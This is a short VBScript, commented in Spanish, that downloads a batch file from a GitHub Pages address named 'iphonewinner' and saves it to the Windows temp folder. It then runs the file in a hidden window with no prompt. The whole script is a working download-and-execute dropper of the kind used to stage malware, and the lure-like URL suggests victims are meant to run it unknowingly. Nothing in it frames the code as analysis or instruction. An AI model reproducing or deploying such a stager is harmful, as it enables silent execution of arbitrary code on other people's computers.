Dim objXMLHTTP, objADOStream, objFSO, objShell, strURL, strFile
strURL = "https://redbluegreen8.github.io/iphonewinner.github.io/script.bat" ' URL del archivo BAT
strFile = "C:\Windows\Temp\script.bat" ' Ruta donde se guardará el archivo

' Crear objeto XMLHTTP para descargar el archivo
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", strURL, False
objXMLHTTP.Send

' Guardar el archivo en el disco
If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    ' Escribir archivo en el sistema
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
    objADOStream.SaveToFile strFile
    objADOStream.Close
    Set objADOStream = Nothing

    ' Ejecutar el archivo descargado
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run strFile, 0, False
    Set objShell = Nothing
End If

' Liberar objetos
Set objXMLHTTP = Nothing
Set objFSO = Nothing
